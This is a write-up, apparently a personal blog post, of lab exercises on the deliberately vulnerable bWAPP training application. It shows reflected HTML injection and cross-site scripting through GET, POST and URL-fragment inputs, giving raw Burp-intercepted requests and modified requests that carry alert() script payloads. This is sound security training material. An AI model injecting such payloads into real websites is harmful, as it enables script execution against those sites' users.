---
layout: post
title:  "BWA - HTML Inject (XSS)"
postid: writeup
categories:
---
# HTML Injection - Reflected (GET) #
## Ask ##
First and Last Name

## Action ##
**Burp intercept and add below to inject**
```
<script>alert('Hello,world!');</script>
```

## RAW ##

```
GET /bWAPP/htmli_get.php?firstname=test&lastname=test&form=submit HTTP/1.1

Host: 172.16.57.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.57.129/bWAPP/htmli_get.php
DNT: 1
Connection: close
Cookie: PHPSESSID=u0dk36qhoj0ngbimoe9mdoov30; security_level=0
Upgrade-Insecure-Requests: 1
```

## MODIFY ##

```
GET /bWAPP/htmli_get.php?firstname=test&lastname=<script>alert("Hello%20world!")</script>&
form=submit HTTP/1.1
```

**Need to use `%20`, it does not take spaces**

<br />

# HTML Injection - Reflected (POST) #
## Ask ##
First and Last Name

## Action ##
**Burp intercept and add below to inject**
```
<script>alert('Hello,world!');</script>
```

## RAW ##
```
POST /bWAPP/htmli_post.php HTTP/1.1
Host: 172.16.57.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.57.129/bWAPP/htmli_post.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
DNT: 1
Connection: close
Cookie: PHPSESSID=u0dk36qhoj0ngbimoe9mdoov30; security_level=0
Upgrade-Insecure-Requests: 1

firstname=test1&lastname=test2&form=submit
```

## MODIFY ##
```
firstname=test1&lastname=<script>alert('Hello,World!');</script>&form=submit
```

**Need to use `%20`, it does not take spaces**

<br />

# HTML Injection - Reflected (URL) #
## Ask ##
Your current URL: http://172.16.57.129/bWAPP/htmli_current_url.php

## Action ##
Change the URL

## RAW ##
```
GET /bWAPP/htmli_current_url.php HTTP/1.1
Host: 172.16.57.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=u0dk36qhoj0ngbimoe9mdoov30; security_level=0
Upgrade-Insecure-Requests: 
```

## MODIFY ##
```
/bWAPP/htmli_current_url.php#<h1>DefenderGB</h1><h2>Strikes_Again</h2><script>alert('Hello,World!');</script>
```

**You can't use `%20`, it will pass as %20.**